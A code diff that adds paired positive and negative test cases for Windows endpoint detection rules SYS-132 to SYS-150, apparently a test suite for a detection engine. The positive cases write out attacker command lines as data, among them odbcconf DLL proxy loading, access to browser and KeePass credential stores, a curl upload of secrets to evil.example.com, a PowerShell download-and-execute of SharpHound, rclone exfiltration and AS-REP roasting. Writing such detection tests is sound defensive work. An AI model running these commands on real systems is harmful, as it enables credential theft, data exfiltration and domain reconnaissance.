@@ -1468,6 +1468,249 @@ CASES = [
         False,
         event(1, image=r"C:\Windows\System32\whoami.exe", command_line="whoami /priv"),
     ),
+    # --- Odbcconf proxy execution (SYS-132) ---
+    (
+        "SYS-132",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\odbcconf.exe",
+            command_line='odbcconf.exe /A {REGSVR "evil.dll"}',
+        ),
+    ),
+    (
+        "SYS-132",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\odbcconf.exe",
+            command_line='odbcconf.exe /a "myapp.dsn"',
+        ),
+    ),
+    # --- mmc.exe loading a staged .msc (SYS-133) ---
+    (
+        "SYS-133",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\mmc.exe",
+            command_line=r"mmc.exe C:\Users\bob\AppData\Local\Temp\evil.msc",
+        ),
+    ),
+    (
+        "SYS-133",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\mmc.exe",
+            command_line=r"mmc.exe C:\Windows\System32\compmgmt.msc",
+        ),
+    ),
+    # --- Non-browser process touched a browser credential DB (SYS-135) ---
+    (
+        "SYS-135",
+        True,
+        event(
+            11,
+            image=r"C:\Windows\System32\cmd.exe",
+            TargetFilename=r"C:\Users\bob\AppData\Local\Temp\Login Data",
+        ),
+    ),
+    (
+        "SYS-135",
+        False,
+        event(
+            11,
+            image=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+            TargetFilename=r"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data",
+        ),
+    ),
+    # --- Script interpreter touched a KeePass database (SYS-136) ---
+    (
+        "SYS-136",
+        True,
+        event(
+            11,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            TargetFilename=r"C:\Users\bob\Documents\passwords.kdbx",
+        ),
+    ),
+    (
+        "SYS-136",
+        False,
+        event(
+            11,
+            image=r"C:\Program Files\KeePass Password Safe 2\KeePass.exe",
+            TargetFilename=r"C:\Users\bob\Documents\passwords.kdbx",
+        ),
+    ),
+    # --- Browser credential DB written into a staging directory (SYS-137) ---
+    (
+        "SYS-137",
+        True,
+        event(11, TargetFilename=r"C:\Users\bob\AppData\Local\Temp\Login Data"),
+    ),
+    (
+        "SYS-137",
+        False,
+        event(
+            11,
+            TargetFilename=r"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data",
+        ),
+    ),
+    # --- Network configuration discovery command (SYS-138) ---
+    (
+        "SYS-138",
+        True,
+        event(1, image=r"C:\Windows\System32\ipconfig.exe", command_line="ipconfig /all"),
+    ),
+    (
+        "SYS-138",
+        False,
+        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe report.txt"),
+    ),
+    # --- Active connections enumerated via netstat -ano (SYS-139) ---
+    (
+        "SYS-139",
+        True,
+        event(1, image=r"C:\Windows\System32\netstat.exe", command_line="netstat -ano"),
+    ),
+    (
+        "SYS-139",
+        False,
+        event(1, image=r"C:\Windows\System32\netstat.exe", command_line="netstat -r"),
+    ),
+    # --- Recursive filesystem enumeration (SYS-140) ---
+    (
+        "SYS-140",
+        True,
+        event(1, image=r"C:\Windows\System32\cmd.exe", command_line=r"cmd.exe /c dir /s C:\Users"),
+    ),
+    (
+        "SYS-140",
+        False,
+        event(1, image=r"C:\Windows\System32\cmd.exe", command_line=r"cmd.exe /c dir C:\Users"),
+    ),
+    # --- Security/EDR product enumerated from the command line (SYS-141) ---
+    (
+        "SYS-141",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\cmd.exe",
+            command_line='tasklist | findstr /i "sentinelone"',
+        ),
+    ),
+    (
+        "SYS-141",
+        False,
+        event(1, image=r"C:\Windows\System32\cmd.exe", command_line="tasklist"),
+    ),
+    # --- Archive created with header/file-list encryption (SYS-142) ---
+    (
+        "SYS-142",
+        True,
+        event(
+            1,
+            image=r"C:\Program Files\7-Zip\7z.exe",
+            command_line=r"7z.exe a -mhe -pS3cr3t archive.7z C:\Users\bob\Documents",
+        ),
+    ),
+    (
+        "SYS-142",
+        False,
+        event(
+            1,
+            image=r"C:\Program Files\7-Zip\7z.exe",
+            command_line=r"7z.exe a archive.7z C:\Users\bob\Documents",
+        ),
+    ),
+    # --- Rclone copy/sync/move against a remote destination (SYS-143) ---
+    (
+        "SYS-143",
+        True,
+        event(
+            1,
+            image=r"C:\Users\bob\AppData\Local\Temp\rclone.exe",
+            command_line=r"rclone.exe copy C:\Users\bob\Documents remote:backup",
+        ),
+    ),
+    (
+        "SYS-143",
+        False,
+        event(
+            1,
+            image=r"C:\Users\bob\AppData\Local\Temp\rclone.exe",
+            command_line="rclone.exe version",
+        ),
+    ),
+    # --- Command-line file upload to a remote server (SYS-144) ---
+    (
+        "SYS-144",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\curl.exe",
+            command_line=r"curl.exe -T C:\Users\bob\Documents\secrets.zip https://evil.example.com/upload",
+        ),
+    ),
+    (
+        "SYS-144",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\curl.exe",
+            command_line="curl.exe https://example.com/file.zip -o file.zip",
+        ),
+    ),
+    # --- SharpHound invoked via script or collection arguments (SYS-148) ---
+    (
+        "SYS-148",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=(
+                "powershell -c IEX (New-Object Net.WebClient).DownloadString("
+                "'http://x/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"
+            ),
+        ),
+    ),
+    (
+        "SYS-148",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell -c Get-Process",
+        ),
+    ),
+    # --- AD account/group enumeration via built-in commands (SYS-149) ---
+    (
+        "SYS-149",
+        True,
+        event(1, image=r"C:\Windows\System32\net.exe", command_line="net user /domain"),
+    ),
+    (
+        "SYS-149",
+        False,
+        event(1, image=r"C:\Windows\System32\net.exe", command_line=r"net use \\server\share"),
+    ),
+    # --- AS-REP roasting tooling (SYS-150) ---
+    (
+        "SYS-150",
+        True,
+        event(
+            1,
+            image=r"C:\Users\bob\impacket\GetNPUsers.py",
+            command_line="GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat",
+        ),
+    ),
+    (
+        "SYS-150",
+        False,
+        event(1, image=r"C:\Windows\System32\whoami.exe", command_line="whoami"),
+    ),
 ]
 
 
